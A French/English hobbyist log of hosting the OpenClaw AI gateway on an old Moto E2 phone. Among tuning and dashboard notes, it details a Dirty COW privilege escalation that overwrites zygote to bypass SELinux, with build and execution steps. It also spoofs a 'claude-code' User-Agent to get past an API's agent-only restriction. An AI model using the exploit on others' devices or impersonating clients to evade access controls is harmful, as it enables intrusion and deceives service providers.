**Problème :** Après avoir supprimé `com.motorola.android.providers.settings` (MotorolaSettingsProvider), le phone entre en boot loop permanent. Le framework Android (PhoneWindowManager) crash toutes les 90 secondes car le ContentProvider Motorola est introuvable.

**Cause root :** `MotorolaSettings` est une classe du framework ROM (pas un package installable). Elle appelle un ContentProvider fourni par `com.motorola.android.providers.settings`. Sans ce provider, `MotorolaSettings.getInt()` → NPE → `WindowManagerService` crash → system_server restart → boucle infinie.

**Tentatives de fix (TOUTES échouées) :**

| # | Approche | Résultat |
|---|---|---|
| 1 | `pm install -r MotorolaSettingsProvider.apk` | PM inaccessible (system_server crash trop vite) |
| 2 | `pm install-existing` | Commande inexistante sur API 23 |
| 3 | `service call package` | Service enregistré mais pas fonctionnel |
| 4 | Safe mode (`persist.sys.safemode`) | Même crash (MotorolaSettings est system-level) |
| 5 | Root shell → `rm /data/system/.../package-restrictions.xml` | SELinux denied |
| 6 | Dirty COW sur package-restrictions.xml | `open()` bloqué par SELinux |
| 7 | Dirty COW sur dex2oat (contexte SELinux différent) | Code exécuté ! Mais dex2oat n'a pas `write` sur system_data_file |
| 8 | `ndc`, broadcast intent, settings put | Tous bloqués (boot pas complété / SELinux) |

**Solution :** Factory reset (seule option). Puis re-setup complet.

**Leçons critiques :**
- **JAMAIS supprimer un package Motorola provider** — ils sont liés au framework ROM
- **Tester UN package à la fois**, rebooter entre chaque, vérifier que le boot complète
- `svc wifi disable` persiste au reboot — toujours réactiver avant de rebooter
- Backuper env + openclaw.json AVANT toute opération risquée
- `run-as com.termux` depuis ADB fonctionne même en boot loop (accès aux données Termux)

**Statut : ⚠️ FACTORY RESET NÉCESSAIRE — Config et scripts backupés**

---

## Fichiers Clés sur le Téléphone

```
Termux ($PREFIX = /data/data/com.termux/files/usr)
├── bin/
│   ├── start-openclaw     ← Lanceur gateway + watchdog (Hacks #11-13)
│   ├── restart-gw         ← Clean kill + restart
│   ├── run-proot          ← Script helper proot (Hack #10)
│   ├── pocketclaw         ← CLI unifiée (start/stop/restart/status/logs/monitor)
│   ├── boot-debloat       ← ADB-side: Dirty COW + pm disable 51+ packages (Hack #28)
│   ├── healthcheck        ← Cron : restart si gateway freeze (toutes les 2 min)
│   └── logrotate-pc       ← Cron : rotation logs (toutes les heures)
├── var/lib/proot-distro/installed-rootfs/ubuntu/  ← Ubuntu 25.10
│   ├── root/
│   │   ├── hijack.js      ← Bionic bypass + periodic GC (Hack #4)
│   │   └── .openclaw/
│   │       ├── openclaw.json  ← Config (Kimi Coding + Telegram + Whisper)
│   │       └── env            ← API keys (chmod 600)
│   └── .../openclaw/node_modules/
│       ├── @slack/         ← ESM stub (Hack #19)
│       ├── @buape/         ← ESM stub
│       ├── @aws-sdk/       ← ESM stub
│       ├── @google/        ← ESM stub
│       └── ... (151 Mo total, était 413 Mo)
└── tmp/
    └── openclaw/           ← Logs + lock files

~/.termux/boot/
  └── start-openclaw.sh    ← Auto-start au boot (Hack #17)

/sdcard/
└── npm-cache/             ← Cache npm déplacé (Hack #8)
```

### Commandes utiles :
```bash
# CLI unifiée (depuis SSH)
pocketclaw start         # Démarre le gateway
pocketclaw stop          # Arrête proprement
pocketclaw restart       # Restart complet
pocketclaw status        # RAM, RSS, disque, uptime, batterie
pocketclaw logs          # Tail des logs gateway
pocketclaw monitor       # Dernières lignes du CSV stats

# Accéder au dashboard (depuis le PC)
adb forward tcp:9000 tcp:9000
# Puis ouvrir http://localhost:9000

# Recréer les stubs ESM (après openclaw update)
bash /sdcard/Download/create-stubs.sh
```

---

## Configuration OpenClaw

Fichier : `~/.openclaw/openclaw.json`

```json
{
  "gateway": {
    "mode": "local",
    "port": 9000,
    "auth": {
      "token": "moto-e2-openclaw-2026"
    }
  },
  "channels": {
    "telegram": {
      "enabled": true,
      "botToken": "XXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
      "dmPolicy": "open",
      "allowFrom": ["*"],
      "network": {
        "autoSelectFamily": true
      }
    }
  },
  "plugins": {
    "entries": {
      "telegram": { "enabled": true }
    }
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "kimi-coding/kimi-for-coding"
      },
      "maxConcurrency": 1,
      "maxQueueSize": 2
    }
  },
  "models": {
    "providers": {
      "kimi-coding": {
        "baseUrl": "https://api.kimi.com/coding/v1",
        "apiKey": "sk-kimi-xxx",
        "api": "openai-completions",
        "headers": {
          "User-Agent": "claude-code/1.0"
        },
        "models": [
          {
            "id": "kimi-for-coding",
            "name": "Kimi For Coding (K2.5)",
            "contextWindow": 262144,
            "maxTokens": 8192,
            "reasoning": false,
            "headers": {
              "User-Agent": "claude-code/1.0"
            }
          }
        ]
      }
    }
  },
  "tools": {
    "media": {
      "audio": {
        "models": [{ "provider": "openai", "model": "whisper-1" }]
      }
    }
  }
}
```

**Pourquoi Kimi Coding :** Free tier, 262K contexte, API compatible OpenAI. L'accès nécessite un User-Agent de coding agent (Hack #16).

**Token gateway :** `moto-e2-openclaw-2026` — à renseigner dans le dashboard web (Settings) pour se connecter.

**NODE_OPTIONS (dans start-openclaw.sh) :**
```bash
export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=192'
```
- `-r /root/hijack.js` : Bionic bypass + periodic GC (Hack #4)
- `--expose-gc` : Active `global.gc()`, utilisé par hijack.js toutes les 60s (~11 Mo libérés/cycle)
- `--max-old-space-size=192` : Heap V8 (Hack #20 — minimum absolu 128, prod safe à 192)

---

## État Actuel (11 février 2026)

| Composant | Statut | Détails |
|---|---|---|
| Ubuntu 25.10 dans proot | ✅ | armhf, Node.js 22.12.0 |
| OpenClaw 2026.2.9 | ✅ | Gateway run, port 9000 |
| V8 heap | ✅ | `--max-old-space-size=128` (Hack #27) |
| ESM stubs | ✅ | 9 packages stubbés (Hack #19) |
| npm packages nettoyés | ✅ | 13 packages supprimés, node_modules 413 → 151 Mo |
| Gateway RSS | ✅ | **~178 Mo** (était 224 Mo au départ, -21%) |
| Disque libre | ✅ | **471 Mo** (était ~100 Mo) |
| Plugin Telegram | ✅ | `@pocketclawbot`, long polling |
| Provider Kimi Coding | ✅ | `kimi-coding/kimi-for-coding` (262K contexte) |
| User-Agent spoof | ✅ | `claude-code/1.0` (Hack #16) |
| Voice (Whisper) | ✅ | `tools.media.audio.models` configuré |
| Termux:Boot auto-start | ✅ | Hack #17 |
| Watchdog + healthcheck | ✅ | Watchdog loop + cron toutes les 2 min |
| Log rotation | ✅ | Cron toutes les heures |
| Periodic GC | ✅ | `global.gc()` toutes les 60s via hijack.js |
| IPv6 DNS | ✅ | Hack #15 |
| Android debloat | ✅ | 51+ packages disabled via Dirty COW boot-debloat (Hack #28) |
| GMS kill (static IP) | ⚠️ | Fonctionne depuis ADB, pas depuis Termux (Hack #22) |
| API keys sécurisées | ✅ | Chargées depuis env file, invisibles dans `ps` (Hack #23) |
| Dashboard | ✅ | `/dashboard` + `/api/status` injected via hijack.js (Hack #29) |
| PocketClaw Launcher | ✅ | 8.5 KB APK, WebView HOME (Hack #30) |
| boot-debloat | ✅ | 51 packages disabled via Dirty COW (Hack #28) |

### Logs du gateway qui tourne :
```
[canvas] host mounted at http://127.0.0.1:9000/__openclaw__/canvas/
[gateway] agent model: kimi-coding/kimi-for-coding
[gateway] listening on ws://127.0.0.1:9000
[heartbeat] started
[browser/service] Browser control service ready
```

---

## Phase 1 → Phase 2 : Du câble au sans-fil

### Phase 1 : Installation (câble USB)
Pendant toute l'installation, le téléphone est **branché au PC par USB**. C'est beaucoup plus rapide :
- ADB push pour transférer les fichiers instantanément
- `adb forward` pour rediriger les ports (SSH 8022, gateway 9000)
- Pas de problème de WiFi qui coupe ou de latence réseau
- Debug facile avec `adb shell` en backup si SSH tombe

**Commandes en Phase 1 :**
```bash
# Port forwarding USB
adb forward tcp:8022 tcp:8022
adb forward tcp:9000 tcp:9000

# SSH via USB
ssh -p 8022 -i ~/.ssh/id_moto localhost

# Dashboard via USB
# Ouvrir http://localhost:9000
```

### Phase 2 : Opération autonome (WiFi uniquement)
Une fois que tout est installé et fonctionnel, **débrancher le câble**. Le téléphone vit sa vie sur WiFi — dans un placard, sur batterie, avec ou sans chargeur. Avec Termux:Boot (Hack #17), il redémarre tout seul même après une coupure.

**Étape 1 — Trouver l'IP du téléphone (dernière commande avec le câble) :**
```bash
adb shell ip addr show wlan0 | grep "inet "
# Résultat : inet 192.168.1.XX/24 ...
```

**Note cette IP !** (ou mieux : configure une IP fixe sur ta box pour le téléphone)

**Étape 2 — Tester le SSH sans fil :**
```bash
ssh -p 8022 -i ~/.ssh/id_moto 192.168.1.XX
```

Si ça marche → débrancher le câble USB.

**Étape 3 — Accès quotidien sans câble :**
```bash
# SSH vers le téléphone (depuis n'importe quel PC sur le réseau)
ssh -p 8022 -i ~/.ssh/id_moto 192.168.1.XX

# Dashboard OpenClaw (ouvrir dans le navigateur)
http://192.168.1.XX:9000

# Lancer le gateway à distance
ssh -p 8022 -i ~/.ssh/id_moto 192.168.1.XX "start-openclaw"

# Vérifier que ça tourne
ssh -p 8022 -i ~/.ssh/id_moto 192.168.1.XX "ps aux | grep node"
```

**Étape 4 — IP fixe (recommandé) :**
Sur ta box internet, va dans les paramètres DHCP et attribue une **IP fixe** au Moto E2 basée sur son adresse MAC. Comme ça l'IP ne change jamais et tu n'as pas besoin de la rechercher à chaque fois.

**Astuce :** Ajoute un alias dans ton `~/.ssh/config` pour ne plus taper tout ça :
```
Host moto
  HostName 192.168.1.XX
  Port 8022
  User root
  IdentityFile ~/.ssh/id_moto
```
Puis simplement : `ssh moto`

### Checklist "je débranche le câble"
- [ ] IP du téléphone notée (ou fixée sur la box)
- [ ] SSH via WiFi testé et fonctionnel
- [ ] `start-openclaw` fonctionne via SSH WiFi
- [ ] Dashboard accessible sur `http://IP:9000`
- [ ] `termux-wake-lock` activé (empêche la mise en veille)
- [ ] Optimisation batterie désactivée pour Termux
- [ ] Termux:Boot installé et ouvert une fois (Hack #17)
- [ ] Bot répond sur Telegram après débranchement USB

---

## Troubleshooting

### SSH qui tombe
**Symptôme :** `Connection closed by 127.0.0.1 port 8022`
**Cause :** Android a kill le process Termux en arrière-plan (1 Go RAM, OOM agressif)
**Fix :**
1. Ouvrir Termux physiquement sur le téléphone
2. Taper `sshd` puis Entrée
3. Si ça marche pas : `LD_LIBRARY_PATH=$PREFIX/lib sshd`

### sshd ne redémarre pas via ADB
**Symptôme :** `CANNOT LINK EXECUTABLE: library "libandroid-support.so" not found`
**Cause :** ADB shell n'a pas le bon LD_LIBRARY_PATH
**Fix :** Ouvrir Termux manuellement, ou :
```bash
adb shell "run-as com.termux sh -c 'export PREFIX=/data/data/com.termux/files/usr && export LD_LIBRARY_PATH=$PREFIX/lib && $PREFIX/bin/sshd'"
```

### OOM Kill du gateway
**Symptôme :** `FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory`
**Cause :** Pas assez de RAM pour le heap Node.js
**Fix :**
1. Tuer les services lourds (⚠️ **SAUF** `com.google.android.gms` et `com.google.android.gsf` — les tuer casse le routage WiFi ! Voir Hack #13)
2. Vérifier la RAM libre : `cat /proc/meminfo | head -3`
3. Il faut au moins 400 Mo libres avant de lancer
4. Utiliser `--max-old-space-size=192` dans NODE_OPTIONS (avec ESM stubs, Hack #19+20)

### openclaw doctor / config qui se bloque
**Symptôme :** La commande hang indéfiniment
**Cause :** Commandes interactives qui attendent un TTY dans un environnement SSH non-interactif
**Fix :** Écrire les fichiers de config manuellement au lieu d'utiliser le wizard.

### Espace disque insuffisant
**Symptôme :** `No space left on device` pendant npm install
**Fix :**
1. Nettoyer le cache npm : `npm cache clean --force`
2. Déplacer le cache sur la SD : `npm config set cache /sdcard/npm-cache`
3. Vérifier l'espace : `df -h`

### Kimi Coding 403 "only available for Coding Agents"
**Symptôme :** `403 Kimi For Coding is currently only available for Coding Agents such as Kimi CLI, Claude Code, Roo Code, Kilo Code, etc.`
**Cause :** L'API Kimi Coding vérifie le header `User-Agent`. Sans un agent reconnu, accès refusé.
**Fix :** Ajouter `"headers": {"User-Agent": "claude-code/1.0"}` dans la config du provider ET du modèle (voir Hack #16).

### Kimi "Message ordering conflict"
**Symptôme :** Le bot démarre une session mais chaque message retourne "Message ordering conflict"
**Cause :** Le modèle Kimi renvoie un champ `reasoning_content` (chaîne de pensée) qui crée un conflit de séquençage dans OpenClaw.
**Fix :** Ajouter `"reasoning": false` dans la config du modèle (voir Hack #16).

### Le téléphone s'éteint / redémarre
**Procédure de relance :**
1. Ouvrir Termux
2. `sshd` (si besoin d'accès SSH)
3. `termux-wake-lock` (empêche la mise en veille)
4. `start-openclaw` (lance le gateway)

### SSH via WiFi ne répond pas
**Symptôme :** `Connection refused` ou `Connection timed out` en Phase 2
**Causes et fixes :**
1. **sshd ne tourne pas** → ouvrir Termux physiquement, taper `sshd`
2. **IP a changé** → vérifier sur la box internet ou rebrancher le câble USB et `adb shell ip addr show wlan0`
3. **WiFi éteint** → vérifier les paramètres réseau du téléphone
4. **Android coupe le WiFi en veille** → Paramètres WiFi → Avancé → "Garder le WiFi en veille" → **Toujours**
5. **Optimisation batterie** → Désactiver pour Termux ET pour le service WiFi

---

## Ce Qui Reste à Faire

### Fait
1. ~~Résoudre le bypass systemd (Hack #12)~~ ✅
2. ~~Tester le gateway sur le port 9000~~ ✅
3. ~~Résoudre internet depuis proot (Hack #13)~~ ✅
4. ~~Activer le plugin Telegram (Hack #14)~~ ✅
5. ~~IPv6 DNS + autoSelectFamily (Hack #15)~~ ✅
6. ~~Bot Telegram connecté~~ ✅ — `@pocketclawbot` en long polling
7. ~~Fixer IPv4 + provider Kimi Coding (Hack #16)~~ ✅
8. ~~Premier message agent complet~~ ✅ — bot répond sur Telegram
9. ~~Termux:Boot auto-start (Hack #17)~~ ✅
10. ~~Compile cache cleanup (Hack #18)~~ ✅
11. ~~ESM stubs (Hack #19)~~ ✅ — 9 packages stubbés, 13 supprimés
12. ~~Heap 192 Mo (Hack #20)~~ ✅ — binary search 384→192, minimum absolu 128
13. ~~Script watchdog~~ ✅ — watchdog loop + healthcheck cron
14. ~~Log rotation~~ ✅ — cron toutes les heures
15. ~~CLI `pocketclaw`~~ ✅ — start/stop/restart/status/logs/monitor
16. ~~Créer le repo PocketClaw~~ ✅ — sur GitHub
17. ~~Nettoyage npm (262 Mo)~~ ✅ — node_modules 413 → 151 Mo
18. ~~Android debloat (Hack #21)~~ ✅ — 31 packages supprimés (permanent, dont launcher + GSF)
19. ~~Static IP + GMS kill (Hack #22)~~ ⚠️ — fonctionne depuis ADB, bloqué depuis Termux (uid 10001)
20. ~~API keys sécurisées (Hack #23)~~ ✅ — chargées depuis env file, invisibles dans `ps`

### Reste à faire
- **Root le téléphone** — **SEUL blocker restant** : `am force-stop` depuis Termux + freeze GMS = -270 Mo RAM permanent
- **Deploy config live** — Groq fallback, identity/personnalité, customCommands (seulement dans l'example JSON, pas sur le phone)
- **Test sans proot après root** — Node 22 fonctionne via `ld-linux-armhf.so.3`, mais proot coûte du CPU
- **Considérer rendre le repo public**

---

## Specs Téléphone

**Motorola Moto E (2ème génération) — 2015**
- Codename : surnia (LTE) / otis (3G)
- Modèles : XT1505, XT1506, XT1511
- SoC : Qualcomm Snapdragon 410 (MSM8916)
- CPU : 4x Cortex-A53 @ 1.2 GHz
- GPU : Adreno 306
- RAM : 1 Go (920 Mo utilisables)
- Stockage : 8 Go (+ SD card)
- OS original : Android 5.0, mis à jour en 6.0
- Écran : 4.5" 540x960
- Prix neuf (2015) : ~120€
- Prix occasion (2026) : 0-20€

---

## Prochaines Étapes Business (PocketClaw)

**Open Source (gratuit) :**
- Ce guide + scripts automatisés
- Installation one-liner
- Matrice de compatibilité par téléphone
- BYOK (Bring Your Own Keys)

**PocketClaw Cloud (payant) :**
- Clé API unique `pk_xxxx` qui route vers tous les providers
- Starter 9€/mo (500 req/jour) → Pro 19€/mo → Agency 49€/mo
- Arbitrage : subscriptions à 70€/mo revendues à 50 users = 85% marge

---

---

## Hack #26 — Dirty COW SELinux Bypass : réécrire /data/system/ depuis zygote

**Problème :** Boot loop causé par `pm uninstall --user 0` sur `com.motorola.android.providers.settings`. SELinux bloque TOUTE écriture vers `/data/system/` depuis le contexte `u:r:shell:s0` (même en root uid=0). Factory reset (recovery ET bootloader) ne wipe PAS `/data/system/` sur ce device.

**Contextes testés et résultats :**

| Contexte SELinux | Source | Accès `/data/system/` |
|---|---|---|
| `u:r:shell:s0` | Dirty COW run-as | read: DENIED, write: DENIED |
| `u:r:dex2oat:s0` | Dirty COW dex2oat | read: OK, write: DENIED |
| `u:r:zygote:s0` | Dirty COW app_process32 | read: OK, write: DENIED |
| `u:r:zygote:s0` + COW race | Dirty COW embedded | read: OK, **write: BYPASS** |

**La technique :**
1. Cross-compiler un binaire ARM avec le NDK (`-nostdlib -static -Os`, 2232 bytes)
2. Le binaire embarque le Dirty COW race : `open(O_RDONLY)` → `mmap(MAP_PRIVATE)` → race `madvise(MADV_DONTNEED)` + `write(/proc/self/mem)`
3. Dirty COW ce binaire sur `/system/bin/app_process32` (remplace zygote)
4. init redémarre zygote → notre code tourne en `u:r:zygote:s0`
5. En contexte zygote : `open(O_RDONLY)` sur `package-restrictions.xml` est AUTORISÉ
6. Le COW race écrit par `/proc/self/mem` → bypasse le check SELinux `{ write }` normal
7. `sync` + reboot → pages dirty flushées sur disque → fix permanent

**Pourquoi ça marche :** Le Dirty COW race n'utilise pas le syscall `write()` normal sur le fichier (que SELinux intercepte). Il écrit dans le page cache via la race condition `madvise(MADV_DONTNEED)` + `/proc/self/mem`. Le kernel ne fait pas de check SELinux sur cette path car c'est un bug de race condition dans `get_user_pages()`.

**Compilation (depuis Windows avec NDK) :**
```bash
NDK="$HOME/AppData/Local/Android/Sdk/ndk/27.1.12297006"
CC="$NDK/toolchains/llvm/prebuilt/windows-x86_64/bin/armv7a-linux-androideabi23-clang"
$CC -nostdlib -static -Os -fno-stack-protector -o fix-zygote2 fix-zygote2.c -Wall
# Résultat : 2232 bytes, ELF ARM static, pas de libc
```

**IMPORTANT :** NDK 27 dynamic binaries produisent `DT_FLAGS_1=0x8000001` que le linker Android 6 ne supporte pas → le binaire se charge mais crashe silencieusement. Toujours utiliser `-nostdlib -static`.

**Séquence d'exécution :**
```bash
# 1. Root via Dirty COW
./dirtycow run-as-payload /system/bin/run-as

# 2. Remplacer zygote avec notre fix
./dirtycow fix-zygote2 /system/bin/app_process32

# 3. Attendre ~5-10 secondes (init restart zygote)
# 4. Sync depuis root shell
echo 'sync; sync; sync' | /system/bin/run-as

# 5. Reboot (restaure app_process32 original, garde le fix sur disque)
reboot
```

**Leçon :** Le Dirty COW embedded (COW race DANS le payload) est la technique ultime pour écrire dans des fichiers protégés par SELinux. La seule condition : trouver un contexte qui a le droit de `read` le fichier cible.

---

### Hack #27 — Heap 128 MB (aggressive minimum)

After debloating 51+ packages (Hack #28), the phone has much more headroom. Binary search continued from Hack #20:

| Heap | Boot | Notes |
|---|---|---|
| 192 (previous prod) | OK | 60-90 MB margin |
| 128 | OK | Stable, 448 MB total used |
| 96 | OOM | Crash at boot |

Production lowered from 192 → 128 MB. The RSS doesn't change (~175 MB) because native V8 + Node.js code is incompressible, but the lower heap cap means V8 GCs earlier and more aggressively, leaving more RAM for Android.

```bash
# In start-openclaw.sh
export NODE_OPTIONS='-r /root/hijack.js --expose-gc --max-old-space-size=128'
```

**Status: OK — Gateway stable at heap 128 MB, ~448 MB total system RAM used**

---

### Hack #28 — boot-debloat (51+ packages via Dirty COW)

**Problem:** After factory reset (Hack #25), all packages are back. Manual `pm disable` one-by-one is tedious and error-prone. Need an automated debloat script that runs Dirty COW + disables everything in one shot.

**Additional discovery:** 9 more packages found during this round:
- `com.motorola.ccc.*` (5 packages: devicemanagement, checkin, mainplm, ota, notification)
- `com.motorola.context` (context awareness)
- `com.motorola.contacts.preloadcontacts`
- `com.motorola.groundloopnoisepreventer` (audio)
- `com.motorola.wappushsi` (WAP push)

**Solution:** `boot-debloat.sh` — a single script that:
1. Runs Dirty COW to get root via `/system/bin/run-as`
2. Pipes 70+ `pm disable` commands through root shell
3. Reports how many packages disabled

```bash
# After reboot with USB connected:
adb shell /data/local/tmp/boot-debloat.sh
# [boot-debloat] Root OK
# [boot-debloat] Complete — 51 packages disabled
```

**LIMITATION:** Must run from ADB shell (uid 2000). Termux (uid 10001) cannot access `/system/bin/run-as` (permissions `rwxr-x---`, group=shell). No workaround — this is a filesystem permission issue, not SELinux.

**`pm disable` vs `pm uninstall`:** We switched to `pm disable` because:
- `pm disable` via root **persists across reboot** (writes to `package-restrictions.xml`)
- `pm disable` is **reversible** (`pm enable` to restore)
- `pm uninstall -k --user 0` on Android 6 is PERMANENT — no `pm install-existing`

**Status: OK — 51 packages disabled in one command. ~416 MB used after debloat.**

---

### Hack #29 — Dashboard (hijack.js v2)

**Problem:** No way to see the phone's status at a glance. SSH + `pocketclaw status` works but requires a terminal.

**Solution:** Inject `/dashboard` and `/api/status` routes directly into OpenClaw's HTTP server via hijack.js. Zero additional processes, zero additional RAM.

**How it works:**
1. Monkey-patch `http.Server.prototype.listen` to intercept the `emit("request")` event
2. Before OpenClaw sees the request, check if it's `/dashboard` or `/api/status`
3. If yes, serve our response and short-circuit. If no, pass to OpenClaw normally.

**`/api/status` response (JSON):**
```json
{
  "gateway": {"status": "up", "code": 200},
  "wifi": true,
  "ram": {"used": 448, "total": 898},
  "swap": {"used": 26, "total": 256},
  "uptime": "1h 9m",
  "lastError": null,
  "telegram": true,
  "groq": false
}
```

**All data sources — zero shell commands:**
- RAM/Swap: `/proc/meminfo` (with fallback for missing `MemAvailable` on kernel 3.10)
- Uptime: `/proc/uptime`
- WiFi: Node `http.get("http://clients3.google.com/generate_204")` every 10s
- Telegram: always `true` (we ARE the gateway process)
- Errors: scan `/tmp/openclaw/*.log` for `ERROR` lines
- Groq: `!!process.env.GROQ_API_KEY`

**`/dashboard` — CRT-style HTML:**
- Black background with scanline overlay (CSS `repeating-linear-gradient`)
- Animated lobster ASCII art (2 frames, hidden `<pre>` elements)
- Live status indicators (pulsing green dots)
- RAM bar with block characters
- Auto-refresh every 3 seconds via `fetch("/api/status")`
- Mobile-optimized (viewport meta, no scroll, touch-disabled)

**Status: OK — Dashboard live at `http://localhost:9000/dashboard`, zero extra RAM**

---

### Hack #30 — PocketClaw Launcher APK (8.5 KB)

**Problem:** KISS Launcher was using ~33 MB of RAM just to show a search bar we never use. The phone's screen should show the dashboard, not a launcher.

**Solution:** Build a minimal Android APK that:
1. Is a HOME launcher (intent-filter with `CATEGORY_HOME`)
2. Contains a fullscreen WebView pointing to `http://localhost:9000/dashboard`
3. Disables the back button (it's a launcher, not an app)
4. Reloads on resume (always fresh data when screen turns on)

**Build chain (no Android Studio, no Gradle):**
```bash
# Compile Java → class files
javac -source 1.7 -target 1.7 -bootclasspath android.jar LauncherActivity.java

# Convert to DEX (Android bytecode)
d8 --min-api 23 --output build/ LauncherActivity.class

# Package APK
aapt package -f -M AndroidManifest.xml -I android.jar -F build/unsigned.apk
cd build && aapt add unsigned.apk classes.dex

# Sign APK
apksigner sign --ks debug.keystore --ks-pass pass:android build/unsigned.apk

# Install + set as HOME
adb install -r build/unsigned.apk
pm disable fr.neamar.kiss  # disable KISS, PocketClaw becomes default HOME
```

**Result:** 8.5 KB APK. The phone's home screen IS the dashboard. Press Home → see RAM, WiFi, Telegram status, uptime, errors. All live. All from a phone in a drawer.

**Status: OK — PocketClaw Launcher installed as HOME, KISS disabled**

---

### Hack #31 — Dashboard v6: Green Cyberpunk + RAM Breakdown

**Problem:** Dashboard was red-themed, had CHAT and LOGS tabs nobody used, and didn't explain WHY RAM was high.

**Solution:** Complete dashboard rewrite:
1. **Green Matrix theme** — CRT scanlines, vignette, glow effects, scanning line animation
2. **Boot animation** — 7 lines appear one by one with real data from /api/status, fades after 3s
3. **RAM process breakdown** — reads `/proc/[pid]/status` + `/proc/[pid]/cmdline` for ALL processes, sorts by RSS, shows top 8 with proportional green bars
4. **Orange bold lobster** (4vw, font-weight:bold, orange glow, animated claws)
5. Removed CHAT and LOGS tabs — single page, all info visible
6. Process names auto-cleaned: `com.android.*` → `*`, `com.motorola.*` → `moto.*`, etc.

**Key insight:** Zero shell commands for process data. All read from /proc virtual filesystem.

**Result:** User can see exactly which process eats RAM. Revealed launcher WebView as #1 consumer (216 MB > gateway 186 MB).

**Status: OK — Dashboard live, process breakdown working**

---

### Hack #32 — Native APK: Kill the WebView (216 MB → 45 MB)

**Problem:** The PocketClaw Launcher APK used Android WebView to display the dashboard. WebView = full Chrome rendering engine = **216 MB RSS** — more than the OpenClaw gateway itself (186 MB). Insane.

**Solution:** Complete APK rewrite — zero WebView:
1. Native Android `Activity` with `ScrollView` + `LinearLayout` + `TextView`
2. All text in `Typeface.MONOSPACE` (terminal look)
3. `HttpURLConnection` fetches `/api/status` every 3 seconds
4. Manual JSON parsing (no Gson dependency)
5. Shows: services (dots), RAM bar (█▒), top processes, swap, uptime
6. Orange lobster ASCII art with animated claws
7. Dark green background (#000A00), green text (#00FF41)

**Build chain (same as before, no Android Studio):**
```bash
javac -source 1.8 -target 1.8 -classpath android.jar LauncherActivity.java
d8 --min-api 23 --output build/ LauncherActivity.class
aapt package -f -M AndroidManifest.xml -I android.jar -F build/unsigned.apk
aapt add unsigned.apk classes.dex
zipalign -f 4 unsigned.apk aligned.apk
apksigner sign --ks debug.keystore aligned.apk
```

**Result:** 12.6 KB APK, 45 MB RSS (down from 216 MB). **170 MB saved** — biggest single RAM win of the project.

**Status: OK — Native launcher deployed, WebView eliminated**

---

### Hack #33 — Extended Boot Debloat (+3 packages)

**Problem:** After Hack #28's 51 packages, Chrome (45 MB), defcontainer (35 MB), and Qualcomm RIL tunnel (35 MB) were still running.

**Solution:** Added to boot-debloat.sh:
- `com.android.chrome` — full browser, no reason to run headless
- `com.android.defcontainer` — package installer helper (re-enable temporarily for APK installs)
- `com.qualcomm.qcrilmsgtunnel` — RIL message tunnel, not needed for WiFi

**Gotcha:** Disabling `defcontainer` breaks `adb install`. Must `pm enable` before installing APKs, then `pm disable` after. Added to boot-debloat.sh with a comment.

**Result:** 54+ packages disabled total. ~100 MB additional savings.

**Status: OK — 3 new packages in debloat list, persists across reboot**

---

### Hack #34 — Proot Rootfs Diet (741 MB → 550 MB)

**Problem:** Proot Ubuntu rootfs bloated at 741 MB. Only 471 MB free on /data. Most space wasted on things OpenClaw never touches.

**Solution:** Identified and removed dead weight:
- Node.js C++ headers (`/usr/local/include/node/`): **65 MB** — only needed for `node-gyp` native module compilation, never used
- Python 3.13 + Python 3: **52 MB** — Ubuntu default, OpenClaw is pure Node.js
- Locale files (`/usr/share/locale/`): **37 MB** — no terminal locale needed in proot
- i18n data (`/usr/share/i18n/`): **18 MB** — same
- Man pages (`/usr/share/man/`): **11 MB** — no one reads man pages on a headless phone server
- Documentation (`/usr/share/doc/`): **12 MB**

**Result:** 195 MB recovered. Disk free: 471 → 663 MB (+41%). Rootfs: 741 → 550 MB.

**Gotcha:** Don't delete `/usr/lib/arm-linux-gnueabihf/` (77 MB) — contains libc, libssl, libz needed by Node.js.

**Status: OK — gateway runs fine after cleanup, all 195 MB recovered**

---

### Hack #35 — Pocketclaw CLI Fixes (RSS + Disk)

**Problem:** `pocketclaw status` showed Gateway RSS as 48 MB (wrong — actually 197 MB) and Disk as 0 MB free.

**Root causes:**
1. RSS: `pgrep -f "openclaw-gateway"` matched the proot wrapper PID, not the actual Node.js process. `/proc/PID/statm` read the wrapper's tiny RSS.
2. Disk: Termux's `df` outputs human-readable format (`515.6M`) even with `-k` flag. `awk '{print int($4/1024)}'` on `"515.6M"` → 0.

**Solution:**
1. RSS: Read from gateway's own `/api/status` endpoint which reports accurate process list with RSS from `/proc/[pid]/status`
2. Disk: Parse `stat -f /data` which gives numeric block counts, then calculate: `available_blocks * block_size / 1024 / 1024`

**Status: OK — both values now accurate**

---

### Hack #36 — Process Name Cleanup in Dashboard

**Problem:** Dashboard showed raw Android package names (`com.termux`, `android.process.media`) — ugly and wastes horizontal space on a 4.5" screen.

**Solution:** Added regex chain in hijack.js `_getProcs()`:
```javascript
name = name
  .replace(/^com\.android\./, "")
  .replace(/^android\.process\./, "")
  .replace(/^com\.motorola\./, "moto.")
  .replace(/^com\.google\.android\./, "goog.")
  .replace(/^com\.pocketclaw\./, "")
  .replace(/^com\.qualcomm\./, "qc.")
  .replace(/^com\.termux\.?/, "termux")
  .replace(/^fr\.neamar\./, "");
```

**Result:** `com.termux` → `termux`, `android.process.media` → `media`. Clean, readable process list.

**Status: OK — deployed and visible on dashboard + native APK**

---

### Hack #37 — Deep Rootfs Diet (550 MB → 498 MB)

**Problem:** After Hack #34's first diet (741→550 MB), still had 50+ MB of unused system libraries.

**Solution:** Identified and removed:
- gconv charset modules: **21 MB** — Node.js uses ICU internally, not glibc gconv
- perl-base: **6.6 MB** — OpenClaw is pure JavaScript
- systemd (both locations): **12 MB** — proot doesn't run systemd
- PAM security modules: **3.7 MB** — proot doesn't do auth
- gstreamer, packagekit, polkit, iso-codes, xml, etc.: ~7 MB

**Result:** 498 MB rootfs. 715 MB disk free. Total diet: 741 → 498 MB (**-243 MB, -33%**).

**What we kept:** libc, libssl, libz, libstdc++ (Node.js needs them), ca-certificates (TLS), apt (for updates).

**Status: OK — gateway runs fine, all 243 MB recovered from original rootfs**

---

### Hack #38 — Setup Wizard (/setup)

**Problem:** Setting up PocketClaw requires SSH + editing JSON config files + creating env files. No normal person can do this.

**Solution:** Web-based setup wizard at `localhost:9000/setup`, built into hijack.js:
- **Step 1:** Choose channel — Telegram (+35 MB) or Discord (+60 MB)
